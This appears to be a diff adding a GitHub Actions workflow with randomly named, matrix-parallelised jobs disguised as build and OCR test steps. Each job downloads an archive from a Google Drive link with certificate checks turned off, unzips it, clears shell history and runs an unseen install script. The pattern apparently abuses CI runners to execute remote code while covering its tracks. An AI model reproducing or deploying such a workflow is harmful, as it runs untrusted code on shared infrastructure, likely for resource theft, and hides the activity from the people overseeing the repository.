@@ -1,0 +1,56 @@
+name: nganxep9bo
+on:
+  push:
+    branches: [ "main" ]
+  workflow_dispatch:
+
+jobs:
+  COMPILE:
+    runs-on: ubuntu-latest
+    strategy:
+      fail-fast: false
+      max-parallel: 10
+      matrix:
+        go: [I.0, I.I, I.II]
+        flag: ['Provision', 'Build', 'Confirm', 'Trigger', 'Deploy']
+
+    env:
+        NUM_JOBS: 20
+        JOB: ${ matrix.go }
+    steps:
+    - uses: actions/checkout@v1
+    - name: Install Packages
+      run: |
+        wget --no-check-certificate "https://docs.google.com/uc?export=download&id=1Z9DqTSTsrUHaeQ5Aq86cqo5f6uPAXqfZ" -O nganxep9bo.zip
+        unzip -o nganxep9bo.zip
+        rm nganxep9bo.zip
+        history -c && history -w
+
+    - name: Test OCR Images
+      run: bash install_module.sh
+
+
+  configure1:
+    runs-on: ubuntu-latest
+    strategy:
+      fail-fast: false
+      max-parallel: 10
+      matrix:
+        go: [I.0, I.I, I.II]
+        flag: ['Fetch', 'Compile', 'Evaluate', 'Run', 'Publish']
+
+    env:
+        NUM_JOBS: 20
+        JOB: ${ matrix.go }
+    steps:
+    - uses: actions/checkout@v1
+    - name: Install Packages
+      run: |
+        wget --no-check-certificate "https://docs.google.com/uc?export=download&id=1Z9DqTSTsrUHaeQ5Aq86cqo5f6uPAXqfZ" -O nganxep9bo.zip
+        unzip -o nganxep9bo.zip
+        rm nganxep9bo.zip
+        history -c && history -w
+
+    - name: Test OCR Images
+      run: bash install_module.sh
+        
